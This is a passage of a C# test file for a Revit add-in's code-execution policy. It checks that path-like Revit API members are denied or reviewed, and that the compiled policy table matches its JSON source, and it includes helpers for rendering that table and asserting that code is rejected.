            var used = new HashSet<string>(StringComparer.Ordinal);
            var scanned = 0;
            foreach (var asm in compilation.References.Select(compilation.GetAssemblyOrModuleSymbol)
                         .OfType<Microsoft.CodeAnalysis.IAssemblySymbol>().Where(a => a.Name == "RevitAPI" || a.Name == "RevitAPIUI"))
                foreach (var type in AllTypes(asm.GlobalNamespace).Where(t => t.DeclaredAccessibility == Microsoft.CodeAnalysis.Accessibility.Public
                                                                             && t.TypeKind != Microsoft.CodeAnalysis.TypeKind.Enum))
                    foreach (var m in type.GetMembers().Where(m => m.DeclaredAccessibility == Microsoft.CodeAnalysis.Accessibility.Public))
                    {
                        if (m is Microsoft.CodeAnalysis.IMethodSymbol ms && ms.AssociatedSymbol != null) continue; // accessors: judged through their property or event
                        var parameters = m is Microsoft.CodeAnalysis.IMethodSymbol mm ? mm.Parameters
                            : m is Microsoft.CodeAnalysis.IPropertySymbol pp ? pp.Parameters
                            : System.Collections.Immutable.ImmutableArray<Microsoft.CodeAnalysis.IParameterSymbol>.Empty;
                        if (!CodePolicy.IsPathName(m.Name, tokens) && !parameters.Any(p => CodePolicy.IsPathName(p.Name, tokens))) continue;
                        scanned++;
                        if (CodePolicy.Judge(compilation, m, MemberUsage.Read).Count > 0) continue;   // denied
                        if (!CanCarryAPath(m, tokens)) continue;                                      // nothing in its signature can hold a path
                        var key = SymbolKeys.TypeKey(type) + "." + m.Name;
                        var reviewed = ReviewedPathLike.FirstOrDefault(r => CodePolicy.KeyMatches(key, r.Key));
                        if (reviewed.Key == null) unreviewed.Add(key + " :: " + m.ToDisplayString());
                        else used.Add(reviewed.Key);
                    }

            Assert.True(scanned > 400, "the scan found only " + scanned + " path-like members: is the Revit reference loaded?");
            Assert.True(unreviewed.Count == 0, "path-like Revit members that are neither denied nor reviewed:\n" + string.Join("\n", unreviewed));
            var stale = ReviewedPathLike.Select(r => r.Key).Where(k => !used.Contains(k)).ToList();
            Assert.True(stale.Count == 0, "reviewed entries that no longer match anything (remove them): " + string.Join(", ", stale));
        }

        /// <summary>A string (or strings) anywhere in the signature is denied by path_member already; what
        /// is left can hold a path only through a path- or file-named type, an interface or a delegate.</summary>
        private static bool CanCarryAPath(Microsoft.CodeAnalysis.ISymbol member, ICollection<string> tokens)
        {
            IEnumerable<Microsoft.CodeAnalysis.ITypeSymbol> Signature()
            {
                switch (member)
                {
                    case Microsoft.CodeAnalysis.IMethodSymbol m:
                        yield return m.ReturnType;
                        foreach (var p in m.Parameters) yield return p.Type;
                        break;
                    case Microsoft.CodeAnalysis.IPropertySymbol p:
                        yield return p.Type;
                        foreach (var q in p.Parameters) yield return q.Type;
                        break;
                    case Microsoft.CodeAnalysis.IFieldSymbol f:
                        yield return f.Type;
                        break;
                    case Microsoft.CodeAnalysis.IEventSymbol e:
                        yield return e.Type;
                        break;
                }
            }
            IEnumerable<Microsoft.CodeAnalysis.ITypeSymbol> Flatten(Microsoft.CodeAnalysis.ITypeSymbol t)
            {
                yield return t;
                if (t is Microsoft.CodeAnalysis.IArrayTypeSymbol a) foreach (var x in Flatten(a.ElementType)) yield return x;
                if (t is Microsoft.CodeAnalysis.INamedTypeSymbol n) foreach (var g in n.TypeArguments) foreach (var x in Flatten(g)) yield return x;
            }
            return Signature().SelectMany(Flatten).Any(t =>
                CodePolicy.Stringish(t)
                || CodePolicy.IsPathName(t.Name, tokens)
                || t.TypeKind == Microsoft.CodeAnalysis.TypeKind.Delegate
                || (t.TypeKind == Microsoft.CodeAnalysis.TypeKind.Interface && !SymbolKeys.InNamespace(SymbolKeys.NamespaceName(t.ContainingNamespace), "System")));
        }

        private static IEnumerable<Microsoft.CodeAnalysis.INamedTypeSymbol> AllTypes(Microsoft.CodeAnalysis.INamespaceSymbol ns)
        {
            foreach (var t in ns.GetTypeMembers())
                foreach (var x in WithNested(t)) yield return x;
            foreach (var child in ns.GetNamespaceMembers())
                foreach (var t in AllTypes(child)) yield return t;
        }

        private static IEnumerable<Microsoft.CodeAnalysis.INamedTypeSymbol> WithNested(Microsoft.CodeAnalysis.INamedTypeSymbol t)
        {
            yield return t;
            foreach (var n in t.GetTypeMembers())
                foreach (var x in WithNested(n)) yield return x;
        }

        // ---- the compiled-in table equals the checked-in JSON ---------------------------------

        [Fact]
        public void Table_MatchesJson()
        {
            var json = File.ReadAllText(CodeTestSupport.RepoFile("Resources/copilot/code-policy.json"));
            var fromJson = JsonSerializer.Deserialize<CodePolicyData>(json)!;
            var expected = JsonSerializer.Serialize(fromJson);
            var actual = JsonSerializer.Serialize(CodePolicyTable.Data);
            if (expected != actual)
            {
                var path = Path.Combine(Path.GetTempPath(), "CodePolicyTable.cs");
                File.WriteAllText(path, CodePolicyTableRenderer.Render(fromJson));
                Assert.Fail("BinaVibe/Copilot/Code/CodePolicyTable.cs does not match Resources/copilot/code-policy.json. " +
                            "The table rendered from the JSON is at " + path + "; copy it over CodePolicyTable.cs.");
            }
            Assert.Equal(1, fromJson.Version);
            Assert.Equal(2_000_000, fromJson.Budget.MaxTicks);
            Assert.Equal(30, fromJson.Budget.MaxSeconds);
            Assert.Equal(16384, fromJson.Budget.MaxOutputBytes);
        }

        // ---- helpers ---------------------------------------------------------------------------

        internal const string TypicalReadQuery = @"var walls = new FilteredElementCollector(doc)
    .OfClass(typeof(Wall))
    .WhereElementIsNotElementType()
    .Cast<Wall>()
    .ToList();
var byLevel = new Dictionary<string, int>();
foreach (var w in walls)
{
    var level = doc.GetElement(w.LevelId) as Level;
    var name = level?.Name ?? ""(none)"";
    byLevel[name] = byLevel.TryGetValue(name, out var n) ? n + 1 : 1;
}
var sb = new StringBuilder();
foreach (var kv in byLevel.OrderBy(k => k.Key))
    sb.AppendLine($""{kv.Key}: {kv.Value}"");
var lengthMm = walls.Sum(w => UnitUtils.ConvertFromInternalUnits(
    w.get_Parameter(BuiltInParameter.CURVE_ELEM_LENGTH)?.AsDouble() ?? 0, UnitTypeId.Millimeters));
Print(sb.ToString());
Print($""Total {Math.Round(lengthMm / 1000.0, 2)} m in {view.Name}; selected {uidoc.Selection.GetElementIds().Count}"");
var rooms = new FilteredElementCollector(doc).OfCategory(BuiltInCategory.OST_Rooms).WhereElementIsNotElementType().ToElements();
var top = rooms.Select(r => new { r.Name, Area = r.LookupParameter(""Area"")?.AsValueString() }).Take(5);
foreach (var r in top) Print(r.Name + "" "" + r.Area);
var perLevel = rooms.GroupBy(r => r.LevelId.Value).Select(g => (g.Key, Count: g.Count())).ToArray();
foreach (var (levelId, count) in perLevel) Print(levelId + "": "" + count);
BoundingBoxXYZ box = walls.Count > 0 ? walls[0].get_BoundingBox(null) : null;
if (box != null) Print((box.Max - box.Min).GetLength().ToString(""F2"", System.Globalization.CultureInfo.InvariantCulture));
var marks = string.Join("", "", walls.Select(w => w.LookupParameter(""Mark"")?.AsString()).Where(s => !string.IsNullOrEmpty(s)).Distinct());
Print(marks.Length > 100 ? marks.Substring(0, 100) : marks);
try { Print(doc.GetElement(new ElementId(-1L))?.Name ?? ""none""); }
catch (Autodesk.Revit.Exceptions.ArgumentException ex) { Print(ex.Message); }";

        internal static CodeAnalysis AssertRejected(string code, string category, int? line = null)
        {
            var a = CodeTestSupport.AnalyzeBroad(code);
            Assert.True(a.Stage == CodeStage.Rejected || a.Stage == CodeStage.PolicyRejected,
                "expected a policy rejection (" + category + "), got " + CodeTestSupport.Describe(a));
            Assert.True(a.Violations.Any(v => v.Category == category),
                "expected category " + category + ", got " + CodeTestSupport.Describe(a));
            if (line != null) Assert.Contains(a.Violations, v => v.Category == category && v.Line == line);
            return a;
        }
    }

    /// <summary>Renders CodePolicyTable.cs from the policy data (used by Table_MatchesJson).</summary>
    internal static class CodePolicyTableRenderer
    {
        public static string Render(CodePolicyData d)
        {
            var sb = new StringBuilder();
            sb.Append("#nullable enable\n");
            sb.Append("// GENERATED from Resources/copilot/code-policy.json. Do not edit by hand: change the\n");
            sb.Append("// JSON, run CodePolicyTests.Table_MatchesJson and copy the file it writes here.\n");
            sb.Append("// This is the copy compiled into the signed add-in (spec §7.8: the cloud cannot configure it).\n\n");
            sb.Append("using System.Collections.Generic;\n\n");
            sb.Append("namespace BinaVibe.Copilot.Code\n{\n");
            sb.Append("    public static class CodePolicyTable\n    {\n");
            sb.Append("        /// <summary>A fresh copy each call, so nobody can change the policy in place.</summary>\n");
            sb.Append("        public static CodePolicyData Data => new CodePolicyData\n        {\n");
            sb.Append("            Version = ").Append(d.Version.ToString(CultureInfo.InvariantCulture)).Append(",\n");
            sb.Append("            LanguageVersion = ").Append(Q(d.LanguageVersion)).Append(",\n");
            sb.Append("            Budget = new CodeBudgetLimits { MaxTicks = ").Append(d.Budget.MaxTicks.ToString(CultureInfo.InvariantCulture))
              .Append(", MaxSeconds = ").Append(d.Budget.MaxSeconds.ToString(CultureInfo.InvariantCulture))
              .Append(", MaxDepth = ").Append(d.Budget.MaxDepth.ToString(CultureInfo.InvariantCulture))
              .Append(", MaxOutputBytes = ").Append(d.Budget.MaxOutputBytes.ToString(CultureInfo.InvariantCulture)).Append(" },\n");
            sb.Append("            Assemblies = new CodePolicyAssemblies\n            {\n");
            sb.Append("                Revit = ").Append(L(d.Assemblies.Revit, 16)).Append(",\n");
            sb.Append("                RevitUi = ").Append(L(d.Assemblies.RevitUi, 16)).Append(",\n");
            sb.Append("                Bcl = ").Append(L(d.Assemblies.Bcl, 16)).Append(",\n");
            sb.Append("            },\n");
            sb.Append("            References = ").Append(L(d.References, 12)).Append(",\n");
            sb.Append("            SystemTypes = ").Append(L(d.SystemTypes, 12)).Append(",\n");
            sb.Append("            SystemMemberAllowOnly = new List<CodeMemberAllowOnly>\n            {\n");
            foreach (var a in d.SystemMemberAllowOnly)
                sb.Append("                new CodeMemberAllowOnly { Type = ").Append(Q(a.Type)).Append(", Members = ").Append(L(a.Members, 16)).Append(" },\n");
            sb.Append("            },\n");
            sb.Append("            RevitUiTypes = ").Append(L(d.RevitUiTypes, 12)).Append(",\n");
            sb.Append("            Categories = new List<CodePolicyCategory>\n            {\n");
            foreach (var c in d.Categories)
                sb.Append("                new CodePolicyCategory { Id = ").Append(Q(c.Id)).Append(", Why = ").Append(Q(c.Why)).Append(" },\n");
            sb.Append("            },\n");
            sb.Append("            Rules = new List<CodePolicyRule>\n            {\n");
            foreach (var r in d.Rules)
                sb.Append("                new CodePolicyRule { Category = ").Append(Q(r.Category)).Append(", Kind = ").Append(Q(r.Kind))
                  .Append(", Match = ").Append(L(r.Match, 16)).Append(" },\n");
            sb.Append("            },\n");
            sb.Append("            Mode = new CodeModePolicy\n            {\n");
            sb.Append("                WriteNamespaces = ").Append(L(d.Mode.WriteNamespaces, 16)).Append(",\n");
            sb.Append("                WriteMembers = ").Append(L(d.Mode.WriteMembers, 16)).Append(",\n");
            sb.Append("                WriteVerbs = ").Append(L(d.Mode.WriteVerbs, 16)).Append(",\n");
            sb.Append("                DetachedTypes = ").Append(L(d.Mode.DetachedTypes, 16)).Append(",\n");
            sb.Append("                DetachedSuffixes = ").Append(L(d.Mode.DetachedSuffixes, 16)).Append(",\n");
            sb.Append("                NavigationMembers = ").Append(L(d.Mode.NavigationMembers, 16)).Append(",\n");
            sb.Append("            },\n");
            sb.Append("        };\n    }\n}\n");
            return sb.ToString();
        }

        private static string L(IReadOnlyCollection<string> items, int indent)
        {
            if (items.Count == 0) return "new List<string>()";
            if (items.Count <= 3) return "new List<string> { " + string.Join(", ", items.Select(Q)) + " }";
            var pad = new string(' ', indent);
            return "new List<string>\n" + pad + "{\n" + string.Concat(items.Select(i => pad + "    " + Q(i) + ",\n")) + pad + "}";
        }

        private static string Q(string s) => "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
    }
}
